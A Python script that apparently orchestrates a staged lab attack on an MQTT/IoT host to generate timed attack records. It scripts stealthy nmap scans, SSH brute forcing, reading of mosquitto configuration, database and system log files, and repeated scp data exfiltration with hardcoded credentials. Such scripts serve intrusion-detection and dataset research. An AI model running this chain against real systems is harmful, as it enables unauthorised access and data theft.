import pickle
import time
from datetime import datetime
import pytz
import apts
import os


def main():
    iteration=str(int(os.getenv("sub_exfiltration_num_it"))+1)
    os.putenv("sub_exfiltration_num_it", iteration)
    experiments_details = []
    target = "10.0.0.20"
    username = "ope"
    password = "maint"
    attack_name = "data_exfiltration_sub"
    start_time_all = datetime.now(tz=pytz.UTC)

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    commands = "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr;nmap -T0 -sI -f 192.168.1.0/24;nmap -T5 -sP 192.168.0.0/24;nmap -T5 -sP 10.0.0.0/24;nmap -T5 -sP 192.168.0.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, "1.1", command_list, attack_name, "netstat_nmap_T5", iteration, sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiment = apts.brute_force("1.2", attack_name, iteration)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.3", command_list2, attack_name,"mqtt_cat",iteration, sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo /usr/bin/nmap -sS -T2 -Pn -p 1883,8883 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.4", command_list2, attack_name,"nmap_mqtt",iteration, sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "nmap -T5 -p 1883,8883 -sV --script banner 10.0.0.0/24; nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.5", command_list2, attack_name,"nmap_banner_sub",iteration, sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 3) DATA EXFILTRATION FROM SUBSCRIBERS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.exfiltrate_scp(target, username, password, "2.1", attack_name, 100,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.2", attack_name, 100,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.3", attack_name, 100,iteration)
    experiments_details.append(experiment)

    time.sleep(180)

    experiment = apts.exfiltrate_scp(target, username, password, "2.4", attack_name, 100,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.5", attack_name, 100,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.6", attack_name, 100,iteration)
    experiments_details.append(experiment)

    time.sleep(180)

    experiment = apts.exfiltrate_scp(target, username, password, "2.7", attack_name, 100,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.8", attack_name, 100,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.9", attack_name, 100,iteration)
    experiments_details.append(experiment)

    time.sleep(180)

    experiment = apts.exfiltrate_scp(target, username, password, "2.10", attack_name, 50,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.11", attack_name, 50,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.12", attack_name, 50,iteration)
    experiments_details.append(experiment)

    time.sleep(180)

    experiment = apts.exfiltrate_scp(target, username, password, "2.13", attack_name, 50,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.14", attack_name, 50,iteration)
    experiments_details.append(experiment)
    experiment = apts.exfiltrate_scp(target, username, password, "2.15", attack_name, 50,iteration)
    experiments_details.append(experiment)

    print(experiments_details)
    end_time_all = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": 0,
        "attack_name": "data_exfiltration_sub",
        "phase_name": "all_steps",
        "start_time": start_time_all,
        "end_time": end_time_all,
        "iteration": iteration,
    }
    experiments_details.append(experiment)
    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)
    print(experiments_details)


if __name__ == '__main__':
    main()
